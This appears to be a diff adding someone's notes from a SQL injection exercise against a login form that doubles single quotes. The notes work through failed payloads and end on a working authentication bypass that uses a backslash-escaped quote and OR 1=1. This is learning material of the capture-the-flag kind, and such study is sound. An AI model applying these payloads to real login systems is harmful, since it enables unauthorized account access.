@@ -1,0 +1,30 @@
+username = victim
+Single quotes are  by adding a second single quote (interesting.), so our previous injection won't work
+I think we will have to do some stuff in the username field.
+
+
+SELECT * FROM users WHERE username='$username' AND pw='$password';
+
+username = victim/*
+password = */
+  Results in no error, but doesn't validate our login.
+  Looks like:
+    SELECT * FROM users WHERE username='victim /*' AND pw='*/  ';
+    So we comment out the inner quotes.
+
+username=victim
+password='OR 1=1#'
+  Attempts to exploit how it might add these "escaped quotes" to our password, no sucess.
+  They probably use something like .replace("\'", "\'\'"); not just adding quotes to the end.
+  Looks like:
+    SELECT * FROM users WHERE username='victim' AND pw=' ' OR 1=1 #'''   '
+  In reality (which doesn't work):
+    SELECT * FROM users WHERE username='victim' AND pw=' ''OR1=1#'' '
+
+username=victim
+password=\' OR 1=1 #
+  We escape 1 quote using \, but since we replace a single quote with 2 this gets turned into:
+    \'' which the first quote is escaped the second isn't.  The second quote gets us out of the
+    pw='' and lets us inject OR 1=1 then we just comment out the last quote.
+  Looks like:
+    SELECT * FROM users WHERE username='victim' AND pw=' \'' OR 1=1 #'
